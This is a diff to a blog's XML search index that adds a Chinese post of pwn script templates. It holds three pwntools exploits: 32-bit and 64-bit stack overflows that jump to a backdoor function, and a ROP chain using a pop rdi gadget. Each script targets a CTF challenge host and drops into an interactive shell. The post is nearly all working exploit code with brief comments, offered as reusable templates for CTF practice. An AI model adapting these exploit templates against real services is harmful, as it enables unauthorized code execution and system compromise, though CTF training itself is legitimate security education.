@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title></title>
+      <link href="/2024/08/16/pwn%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%9D%BF/"/>
+      <url>/2024/08/16/pwn%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%9D%BF/</url>
+      
+        <content type="html"><![CDATA[<h1 id="pwn常用脚本模板"><a href="#pwn常用脚本模板" class="headerlink" title="pwn常用脚本模板"></a>pwn常用脚本模板</h1><p>栈溢出脚本</p><p>（32位）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28181</span>)  <span class="comment">#创建一个远程连接，将程序与指定的主机和端口建立起联系</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)    <span class="comment">#地址是后门函数所在的函数开始的地址</span></span><br><span class="line">p.sendline(payload)                         <span class="comment">#将构造好的payload发送到远程连接的目标端点</span></span><br><span class="line">p.interactive()    </span><br></pre></td></tr></table></figure><p>（64位）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25079</span>)           </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x401186</span>)   </span><br><span class="line">p.sendline(payload)                         </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ROP脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29267</span>)     </span><br><span class="line">pop_rdi=<span class="number">0x0400713</span></span><br><span class="line">bin_addr=<span class="number">0x0400616</span>                                </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_addr)+p64(<span class="number">0x400611</span>)    </span><br><span class="line">p.sendline(payload)                        </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【cnss】新手教程：断点和异常</title>
       <link href="/2024/08/06/%E3%80%90cnss%E3%80%91%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B%EF%BC%9A%E6%96%AD%E7%82%B9%E5%92%8C%E5%BC%82%E5%B8%B8/"/>
       <url>/2024/08/06/%E3%80%90cnss%E3%80%91%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B%EF%BC%9A%E6%96%AD%E7%82%B9%E5%92%8C%E5%BC%82%E5%B8%B8/</url>
